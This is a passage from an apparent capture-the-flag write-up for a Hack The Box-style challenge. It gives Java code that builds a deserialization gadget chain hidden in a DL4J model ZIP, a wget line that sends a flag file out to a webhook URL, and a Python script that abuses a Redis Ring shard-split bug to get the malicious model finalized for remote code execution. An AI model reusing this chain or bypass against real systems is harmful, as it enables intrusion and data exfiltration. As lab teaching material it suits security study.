        System.out.println("[*] 3  Patching nd4j BaseJsonNode...");

        patchBaseJsonNode();

  

        System.out.println("[*] 4  Assembling BadAttributeValueExpException gadget...");

        BadAttributeValueExpException payload = buildPayload(templates);

  

        System.out.println("[*] 5  Serializing gadget...");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {

            oos.writeObject(payload);

        }

        byte[] gadgetBytes = baos.toByteArray();

        System.out.printf("[+]    preprocessor.bin  %,d bytes%n", gadgetBytes.length);

  

        System.out.println("[*] 6  Creating valid DL4J MultiLayerNetwork...");

        MultiLayerConfiguration conf = new NeuralNetConfiguration.Builder()

            .list()

            .layer(new OutputLayer.Builder(LossFunctions.LossFunction.MSE)

                .nIn(4).nOut(2)

                .activation(Activation.IDENTITY)

                .build())

            .build();

        MultiLayerNetwork net = new MultiLayerNetwork(conf);

        net.init();

        ModelSerializer.writeModel(net, baseZip, false);

        System.out.println("[+]    model_base.zip written");

  

        System.out.println("[*] 7  Injecting preprocessor.bin into model.zip...");

        appendToZip(baseZip, finalZip, "preprocessor.bin", gadgetBytes);

        System.out.printf("[+]    model.zip  %,d bytes  <- use this file%n%n",

                          finalZip.length());

  

        System.out.println("Run:  python3 exploit.py <TARGET_URL> model.zip");

    }

}
```

**Understanding `BuildExploit.java`:**

This script performs the heavy lifting of generating our malicious payload. Let's break it down:

1. **`buildTransletBytecode()`:** It uses `javassist` to dynamically generate a new Java class named `EvilTranslet` in raw bytecode. The constructor of this class contains our malicious shell command (`wget ... /flag.txt`).

2. **`buildTemplates()`:** It takes our `EvilTranslet` bytecode and stuffs it inside a `TemplatesImpl` object. This is a well-known Java class that, when triggered, will instantiate the bytecode hidden inside it, thereby executing our shell command.

3. **`patchBaseJsonNode()`:** To bypass some serialization restrictions in the DL4J library, it dynamically removes the `writeReplace` method from `BaseJsonNode` using `javassist`.

4. **`buildPayload()`:** It wraps our malicious `TemplatesImpl` inside a `POJONode`, and then wraps _that_ inside a `BadAttributeValueExpException`. This creates a chain reaction (a "Gadget Chain"). When the backend server attempts to deserialize the `BadAttributeValueExpException`, it will automatically unpack the `POJONode`, which triggers the `TemplatesImpl`, which executes our `EvilTranslet` bytecode!

5. **`main()`:** It executes the above steps, serializes the final gadget chain into binary data, generates a legitimate DL4J `model_base.zip` (containing `configuration.json` and `coefficients.bin`), and finally appends our malicious binary data into the ZIP file under the name `preprocessor.bin`.
### Step 4 — Compile

The `pom.xml` file is the project configuration for Maven. It defines the dependencies required for our exploit, such as `javassist` for runtime bytecode manipulation and `deeplearning4j` libraries to construct a valid model structure. It instructs Maven on how to build the project, manages versioning, and automates the classpath setup required for our complex serialization payloads.

```bash
┌──(shadow0x㉿cypher)-[~/signetry-exploit]
└─$ mvn clean compile
```

Output:

```bash
[INFO] Scanning for projects...
[INFO] 
[INFO] ------------------------< htb:signetry-exploit >------------------------
[INFO] Building signetry-exploit 1.0
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- clean:3.2.0:clean (default-clean) @ signetry-exploit ---
[INFO] Deleting /home/shadow0x/signetry-exploit/target
[INFO] 
[INFO] --- resources:3.3.1:resources (default-resources) @ signetry-exploit ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /home/shadow0x/signetry-exploit/src/main/resources
[INFO] 
[INFO] --- compiler:3.8.1:compile (default-compile) @ signetry-exploit ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /home/shadow0x/signetry-exploit/target/classes
[WARNING] /home/shadow0x/signetry-exploit/src/main/java/BuildExploit.java:[1,52] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl is internal proprietary API and may be removed in a future release
[WARNING] /home/shadow0x/signetry-exploit/src/main/java/BuildExploit.java:[60,12] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl is internal proprietary API and may be removed in a future release
[WARNING] /home/shadow0x/signetry-exploit/src/main/java/BuildExploit.java:[61,9] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl is internal proprietary API and may be removed in a future release
[WARNING] /home/shadow0x/signetry-exploit/src/main/java/BuildExploit.java:[61,28] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl is internal proprietary API and may be removed in a future release
[WARNING] /home/shadow0x/signetry-exploit/src/main/java/BuildExploit.java:[84,55] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl is internal proprietary API and may be removed in a future release
[WARNING] /home/shadow0x/signetry-exploit/src/main/java/BuildExploit.java:[128,9] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl is internal proprietary API and may be removed in a future release
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  3.191 s
[INFO] Finished at: 2026-07-29T05:09:33-04:00
[INFO] ------------------------------------------------------------------------
```

### Step 5 — Generate `model.zip`

Run the Java class, replacing the webhook URL with your own:

```bash
┌──(shadow0x㉿cypher)-[~/signetry-exploit]
└─$ mvn exec:java \
  -Dexec.mainClass=BuildExploit \
  "-Dexec.args=https://webhook.site/ef0c91df-5647-47bb-8d87-625ba5154d97" \
  "-Dexec.jvmArgs=\
--add-opens java.base/java.lang=ALL-UNNAMED \
--add-opens java.base/java.io=ALL-UNNAMED \
--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens java.management/javax.management=ALL-UNNAMED \
--add-opens java.base/java.lang.reflect=ALL-UNNAMED \
--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-exports java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED \
--add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED"
```

Output: 

```bash
[INFO] Scanning for projects...
[INFO] 
[INFO] ------------------------< htb:signetry-exploit >------------------------
[INFO] Building signetry-exploit 1.0
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- exec:3.1.1:java (default-cli) @ signetry-exploit ---
[*] 1  Compiling EvilTranslet bytecode...
[+]    897 bytes
[*] 2  Building TemplatesImpl...
WARNING: An illegal reflective access operation has occurred
WARNING: Illegal reflective access by BuildExploit (file:/home/shadow0x/signetry-exploit/target/classes/) to constructor com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl()
WARNING: Please consider reporting this to the maintainers of BuildExploit
WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
WARNING: All illegal access operations will be denied in a future release
[*] 3  Patching nd4j BaseJsonNode...
[+]    writeReplace() removed
[*] 4  Assembling BadAttributeValueExpException gadget...
[*] 5  Serializing gadget...
[+]    preprocessor.bin  2,242 bytes
[*] 6  Creating valid DL4J MultiLayerNetwork...
SLF4J: Failed to load class "org.slf4j.impl.StaticLoggerBinder".
SLF4J: Defaulting to no-operation (NOP) logger implementation
SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.
[+]    model_base.zip written
[*] 7  Injecting preprocessor.bin into model.zip...
[+]    model.zip  2,336 bytes  <- use this file

Run:  python3 exploit.py <TARGET_URL> model.zip
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  2.602 s
[INFO] Finished at: 2026-07-29T05:13:09-04:00
[INFO] ------------------------------------------------------------------------
```

All three entries are present. `preprocessor.bin` is our serialized gadget chain!
### Step 6 — Verify the archive

```bash
┌──(shadow0x㉿cypher)-[~/signetry-exploit]
└─$ unzip model.zip
 
Archive: model.zip 
inflating: configuration.json 
inflating: coefficients.bin 
inflating: preprocessor.bin
```

All three entries are present. `preprocessor.bin` is our serialized gadget chain!
## The Redis Ring Shard-Split Bypass

Before we can ask the Curator to finalize our malicious `model.zip`, we hit one last roadblock. To finalize a model, it must be "sealed" first. However, the Go backend uses a strict ZIP scanner when sealing a model (`POST /seal`). If we try to seal our malicious `model.zip`, the scanner will detect `preprocessor.bin` (which is not a standard DL4J component expected by the scanner) and reject it!

So, how can we finalize a model without sealing it? We exploit a bug in how the application interacts with Redis clusters!

When a model is staged (`POST /stage`), it writes three keys to Redis:

- `model:blob:<token>` (The actual zip file data)
- `model:unsealed:<token>` (Marker showing it's unsealed)
- `model:intake:<token>` (Marker for the intake queue)

When we withdraw the model (`POST /withdraw`), the application attempts to delete all three keys at once:

`h.store.Del(ctx, blobKey, unsealedKey, intakeKey)`

However, the backend uses `go-redis` with a **Ring cluster**. When you send a multi-key command like `DEL` to a Ring cluster, `go-redis` only routes the command based on the hash of the **first** key. It sends the `DEL` command to whatever shard owns `blobKey`. If `unsealedKey` or `intakeKey` happen to hash to a different shard, they are ignored by the deletion!

This means if we repeatedly `Stage` and `Withdraw` the model, we will eventually hit a scenario where the two marker keys are deleted (because they landed on the routed shard), but the `blobKey` survives (because it landed on the other shard)! The system will then see that the `unsealedKey` marker is gone, assume the model was properly sealed, and allow us to Finalize it without ever hitting the restrictive ZIP scanner!

## Step 7 — Running the Final Exploit

Since we already completed the JWT Forgery, the Type-Map upload, and the XSS Curator takeover manually, we just need a script to perform the Redis Shard-Split loop and trigger the `/finalize` endpoint.

Create `exp.py` with the following code:

```python
#!/usr/bin/env python3

import sys, time

import requests

  

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.72:31631"

MODEL_FILE = sys.argv[2] if len(sys.argv) > 2 else "model.zip"

  

MAINTAINER_EMAIL  = "dms@htb.com"

MAINTAINER_PWD    = "T3t496W<q+$P"          # The password we set

CONSERVATOR_EMAIL = "conservator@htb.com"

CONSERVATOR_PWD   = "8ss7@[9v/eX"           # The password the XSS set

  

ms = requests.Session()

cs = requests.Session()

  

# 1. Login to both accounts

print("[*] Logging in as Maintainer and Conservator...")

ms.post(f"{TARGET}/api/login", json={"login": MAINTAINER_EMAIL, "password": MAINTAINER_PWD})

cs.post(f"{TARGET}/api/login", json={"login": CONSERVATOR_EMAIL, "password": CONSERVATOR_PWD})

  

try:

    model_bytes = open(MODEL_FILE, "rb").read()

except FileNotFoundError:

    sys.exit(f"[-] '{MODEL_FILE}' not found.")

  

# 2. Redis Ring DEL shard-split bypass loop

print("[*] Starting Redis Ring shard-split bypass loop …")

print("    (stage → withdraw, never call /seal, target: removed==2 AND blob exists)")

token = None

attempt = 0

  

while True:

    attempt += 1

  

    # Stage the malicious archive

    r = ms.post(f"{TARGET}/stage", data=model_bytes, headers={"Content-Type": "application/zip"})

    tok = r.json().get("token", "")

    if not tok: continue

  

    # Withdraw WITHOUT sealing

    r = ms.post(f"{TARGET}/withdraw", json={"token": tok}, headers={"Content-Type": "application/json"})

    removed = r.json().get("removed", 0)

  

    # We need exactly the 2 marker keys removed, and the blob key to survive!

    if removed != 2:

        print(f"    [{attempt:3d}] removed={removed} (need 2) – wrong shard, retry")

        continue

  

    # Verify the blob key survived

    r = ms.get(f"{TARGET}/api/versions/{tok}")

    exists = r.json().get("exists", False) if r.status_code == 200 else False

    if exists:

        print(f"    [{attempt:3d}] removed=2  blob_exists={exists}")

        token = tok

        break

  

print(f"\n[+] Shard split achieved after {attempt} attempt(s)!  Token: {token}\n")

  

# 3. Curator finalizes the secretly-unreviewed blob

print("[*] Conservator (curator) finalizes the model")

r = cs.post(f"{TARGET}/finalize", json={"token": token}, headers={"Content-Type": "application/json"})

  

if r.status_code in (200, 202):

    print("[+] Done!")

    print("    The Java certifier will restore the model, deserialize preprocessor.bin,")

    print("    and execute the translet payload.  Check your webhook for HTB{…}.")

else:

    print(f"[-] Finalize failed: {r.text}")

```

**Understanding the Final Exploit Script (`pwn.py`):**

Since we are executing this script _after_ manually hijacking the Curator account via XSS, this script skips the initial JWT forgery and XSS steps. Here is what it does:

1. **Login:** It establishes two sessions, one for our Maintainer account (which has permission to upload/stage models) and one for our hijacked Conservator/Curator account (which has permission to finalize models).
   
2. **The Bypass Loop (`while True`):** It enters a loop where the Maintainer account repeatedly `POST /stage`s the malicious `model.zip` and immediately `POST /withdraw`s it.
   
3. **Checking the Shards:** After each withdrawal, it checks the server's response. It is looking for `removed=2` (meaning exactly the two marker keys were deleted). If `removed=2`, it makes a GET request to verify that the blob data actually survived on the other Redis shard. Once this perfect condition is met, it breaks out of the loop and saves the target model token.

4. **The Kill Shot:** Finally, the Conservator account sends a `POST /finalize` request using the surviving model token. Because the unsealed marker key was destroyed in the bypass loop, the backend assumes the model was legitimately reviewed and sealed. It passes the malicious ZIP to the internal Java backend, where the deserialization RCE triggers!
   
Run the script : 

```bash
┌──(shadow0x㉿cypher)-[~/signetry-exploit]
└─$ python3 pwn.py http://154.57.164.82:30122/ model.zip
[*] Logging in as Maintainer and Conservator...
[*] Starting Redis Ring shard-split bypass loop …
    (stage → withdraw, never call /seal, target: removed==2 AND blob exists)
    [  1] removed=1 (need 2) – wrong shard, retry
    [  4] removed=1 (need 2) – wrong shard, retry
    [  5] removed=2  blob_exists=True

[+] Shard split achieved after 5 attempt(s)!  Token: e08d35b485baf74cc9523ce3

[*] Conservator (curator) finalizes the model
[+] Done!
    The Java certifier will restore the model, deserialize preprocessor.bin,
    and execute the translet payload.  Check your webhook for HTB{…}.

```

And immediately upon the backend parsing the model, we catch the flag sent out to our webhook server:

![[flagwebhook.png]]






